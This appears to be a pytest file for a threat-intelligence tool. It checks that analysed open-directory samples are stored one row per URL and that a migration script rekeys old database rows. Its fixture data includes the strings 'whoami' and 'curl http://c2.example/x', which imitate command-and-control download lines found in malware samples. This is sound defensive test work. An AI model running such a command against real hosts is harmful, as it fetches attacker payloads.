"""Sample verdicts are keyed on each file's own URL."""
from __future__ import annotations

import importlib.util
from datetime import datetime
from pathlib import Path

import duckdb

from cti import store
from cti.mcp import server
from cti.probe import sandbox

REPO = Path(__file__).resolve().parents[1]
HOST = "198.51.100.7"
BASE = f"http://{HOST}:18080"


def _result(url, name, sha):
    return {"url": url, "path": name, "sha256": sha * 64, "size": 3,
            "magic": "ASCII text", "mime": "text/plain", "yara_hits": [],
            "strings_sample": ["whoami", "curl http://c2.example/x"],
            "extracted": {"urls": ["http://c2.example/x"]}, "verdict": "interesting"}


def _rows():
    with store.connect(read_only=True) as con:
        return sorted(con.execute(
            "SELECT url, path, sha256 FROM opendir_samples").fetchall())


def test_same_named_files_in_two_folders_are_two_rows(monkeypatch):
    """Keyed on (host, first URL of the batch, bare filename), the second
    .bash_history overwrote the first."""
    results = [_result(f"{BASE}/root/.bash_history", ".bash_history", "a"),
               _result(f"{BASE}/home/op/.bash_history", ".bash_history", "b")]
    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze",
                        lambda urls, **kw: {"results": results, "errors": [],
                                            "fetched": 2, "analyzed": 2, "error": None})

    sandbox.analyze_urls([r["url"] for r in results], indicator=HOST)

    assert _rows() == [(f"{BASE}/home/op/.bash_history", ".bash_history", "b" * 64),
                       (f"{BASE}/root/.bash_history", ".bash_history", "a" * 64)]


def test_a_file_analysed_again_in_another_batch_updates_its_row(monkeypatch):
    def run(urls, sha):
        monkeypatch.setattr(
            sandbox.vm_proxy, "fetch_and_analyze",
            lambda urls, **kw: {"results": [_result(u, u.rsplit("/", 1)[-1], sha)
                                            for u in urls],
                                "errors": [], "fetched": len(urls),
                                "analyzed": len(urls), "error": None})
        sandbox.analyze_urls(urls, indicator=HOST)

    run([f"{BASE}/a.bin", f"{BASE}/b.bin"], "a")
    run([f"{BASE}/b.bin"], "c")          # b first in its batch this time

    assert _rows() == [(f"{BASE}/a.bin", "a.bin", "a" * 64),
                       (f"{BASE}/b.bin", "b.bin", "c" * 64)]


def test_get_opendir_samples_returns_the_full_result_for_one_file():
    with store.connect() as con:
        store.upsert_opendir_samples(
            con, indicator_value=HOST, url=BASE + "/",
            results=[_result(f"{BASE}/x.sh", "x.sh", "d")],
            analyzed_at=datetime(2026, 11, 13))

    listing = server.get_opendir_samples(HOST)
    assert "strings_sample" not in listing["columns"]

    one = server.get_opendir_samples(HOST, sha256="d" * 64)
    row = dict(zip(one["columns"], one["rows"][0]))
    assert "whoami" in row["strings_sample"]
    assert "c2.example" in row["extracted"]


# --------------------------------------------------------------------------- #
# migration of rows written under the old key
# --------------------------------------------------------------------------- #

def _migration():
    spec = importlib.util.spec_from_file_location(
        "migrate_sample_keys", REPO / "scripts" / "migrate_sample_keys.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _old_rows(con):
    """As written before the change: url is the batch's first file, path
    has lost its leading dot and had odd characters replaced."""
    now = datetime(2026, 11, 12)
    for url in (f"{BASE}/.bash_history", f"{BASE}/kit/My File.bin", f"{BASE}/a.bin"):
        con.execute("INSERT INTO opendir_files (indicator_value, url, path, is_dir, "
                    "first_seen, last_seen) VALUES (?, ?, ?, false, ?, ?)",
                    [HOST, BASE + "/", url, now, now])
    for path, sha in (("bash_history", "1"), ("My_File.bin", "2"), ("a.bin", "3"),
                      ("gone.bin", "4")):
        con.execute("INSERT INTO opendir_samples (indicator_value, url, path, sha256, "
                    "analyzed_at) VALUES (?, ?, ?, ?, ?)",
                    [HOST, f"{BASE}/.bash_history", path, sha * 64, now])


def test_migration_gives_each_old_row_its_own_url_and_real_name():
    with store.connect() as con:
        _old_rows(con)
    path = str(store.db_path())

    plan = _migration().plan(duckdb.connect(path, read_only=True))
    assert len(plan["update"]) == 3 and [u["path"] for u in plan["unmatched"]] == ["gone.bin"]
    assert _rows()[0][0] == f"{BASE}/.bash_history"            # a dry run changes nothing

    _migration().main([path, "--apply", "--no-backup"])

    assert _rows() == [
        (f"{BASE}/.bash_history", ".bash_history", "1" * 64),
        (f"{BASE}/.bash_history", "gone.bin", "4" * 64),       # left as it was
        (f"{BASE}/a.bin", "a.bin", "3" * 64),
        (f"{BASE}/kit/My%20File.bin", "My File.bin", "2" * 64)] or _rows() == [
        (f"{BASE}/.bash_history", ".bash_history", "1" * 64),
        (f"{BASE}/.bash_history", "gone.bin", "4" * 64),
        (f"{BASE}/a.bin", "a.bin", "3" * 64),
        (f"{BASE}/kit/My File.bin", "My File.bin", "2" * 64)]


def test_migration_is_safe_to_run_twice_and_backs_up_first(tmp_path):
    with store.connect() as con:
        _old_rows(con)
    path = store.db_path()

    _migration().main([str(path), "--apply"])
    after = _rows()
    _migration().main([str(path), "--apply"])

    assert _rows() == after
    assert len(list(path.parent.glob(path.name + ".bak-*"))) >= 1
